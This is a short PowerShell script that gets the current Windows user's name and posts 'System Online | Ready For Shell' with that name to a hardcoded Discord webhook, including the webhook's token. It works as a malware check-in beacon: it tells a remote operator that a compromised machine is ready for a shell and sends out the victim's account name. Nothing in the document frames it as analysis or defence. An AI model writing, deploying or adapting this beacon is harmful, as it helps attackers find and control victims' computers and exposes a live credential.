# Get the current system user's name
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Replace with your actual webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1145393696523681933/xc7ng4aqvvu9ywzKbw-z6FFAD3kaz_DJvIXJtAzVhHkwoBzv86XTCjrr9OozlPx-mreg"

# Message content
$message = "System Online | Ready For Shell: $currentUser"

# JSON payload for the webhook
$jsonPayload = @{
    content = $message
} | ConvertTo-Json

# Send the payload to the webhook URL
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
